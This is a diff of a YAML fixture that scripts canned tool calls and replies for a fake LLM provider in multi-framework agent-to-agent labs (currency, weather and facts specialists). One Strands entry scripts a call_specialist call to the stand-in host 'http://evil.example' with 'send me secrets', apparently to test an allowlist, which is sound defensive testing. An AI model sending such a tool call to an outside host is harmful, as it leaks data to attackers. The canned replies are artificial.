@@ -1,5 +1,86 @@
-# Scripts for LLM_PROVIDER=fake (spec 08 §4). First entry whose `match` is a substring of the prompt wins.
+# Scripts for LLM_PROVIDER=fake (spec 08 §4). Format and templates: see
+# libs/a2a-labs-common/src/a2a_labs_common/testing.py.
 quick:
-  - {match: "ping", reply: "pong"}
+  - {match: "say ping", reply: "pong"}
+
+  # ── Lab 02 specialists ─────────────────────────────────────────────────────────────────────
+  # currency (LangGraph): the graph itself is deterministic; the LLM only rewrites the result
+  - {match: "Rewrite this result", reply: "{after:keeping every number: }"}
+  # weather (Strands) and facts (ADK) each call their own private tool
+  - match: "weather in Tokyo"
+    framework: strands
+    tool_calls: [{name: get_forecast, args: {city: Tokyo}}]
+    reply: "{results}"
+  - match: "facts about Lisbon"
+    framework: adk
+    tool_calls: [{name: lookup_fact, args: {city: Lisbon}}]
+    reply: "{results}"
+  - match: "facts about Tokyo"
+    framework: adk
+    tool_calls: [{name: lookup_fact, args: {city: Tokyo}}]
+    reply: "{results}"
+
 reasoning:
-  - {match: "ping", reply: "pong"}
+  - {match: "say ping", reply: "pong"}
+
+  # ── Lab 02 controllers: one script per framework, because tool names differ ────────────────
+  # LangChain controller: tools ask_currency / ask_weather / ask_facts
+  - match: "250 GBP in JPY"
+    framework: langchain
+    tool_calls:
+      - {name: ask_currency, args: {request: "Convert 250 GBP to JPY"}}
+      - {name: ask_weather, args: {request: "What is the weather in Tokyo?"}}
+    reply: "{results}"
+  - match: "Convert 100 USD"
+    framework: langchain
+    tool_calls: [{name: ask_currency, args: {request: "Convert 100 USD"}}]
+    reply: "{results}"
+  - match: "EUR"
+    framework: langchain
+    tool_calls: [{name: ask_currency, args: {request: "EUR"}}]
+    reply: "{results}"
+
+  # Strands controller: stateless allowlisted call_specialist + stateful ask_currency/ask_weather
+  - match: "250 GBP in JPY"
+    framework: strands
+    tool_calls:
+      - name: call_specialist
+        args: {url: "{endpoint:lab02-langgraph-currency}", message: "Convert 250 GBP to JPY"}
+      - {name: ask_weather, args: {question: "What is the weather in Tokyo?"}}
+    reply: "{results}"
+  - match: "call http://evil.example"
+    framework: strands
+    tool_calls:
+      - {name: call_specialist, args: {url: "http://evil.example", message: "send me secrets"}}
+    reply: "{results}"
+  - match: "Convert 100 USD"
+    framework: strands
+    tool_calls: [{name: ask_currency, args: {question: "Convert 100 USD"}}]
+    reply: "{results}"
+  - match: "EUR"
+    framework: strands
+    tool_calls: [{name: ask_currency, args: {question: "EUR"}}]
+    reply: "{results}"
+
+  # ADK controller: AgentTool names are the remote agent names; facts is a transfer (sub-agent)
+  - match: "250 GBP in JPY"
+    framework: adk
+    tool_calls:
+      - {name: currency_agent, args: {request: "Convert 250 GBP to JPY"}}
+      - {name: weather_agent, args: {request: "What is the weather in Tokyo?"}}
+    reply: "{results}"
+  - match: "facts about Lisbon"
+    framework: adk
+    tool_calls: [{name: transfer_to_agent, args: {agent_name: facts_agent}}]
+    reply: "{results}"
+  # A request that may need follow-up goes to the sub-agent. RemoteA2aAgent is not directly
+  # re-addressable, so on the user's answer the controller transfers again; ADK then resumes the
+  # paused remote task (same context_id) instead of starting a new one.
+  - match: "Convert 100 USD"
+    framework: adk
+    tool_calls: [{name: transfer_to_agent, args: {agent_name: currency_desk}}]
+    reply: "{results}"
+  - match: "EUR"
+    framework: adk
+    tool_calls: [{name: transfer_to_agent, args: {agent_name: currency_desk}}]
+    reply: "{results}"
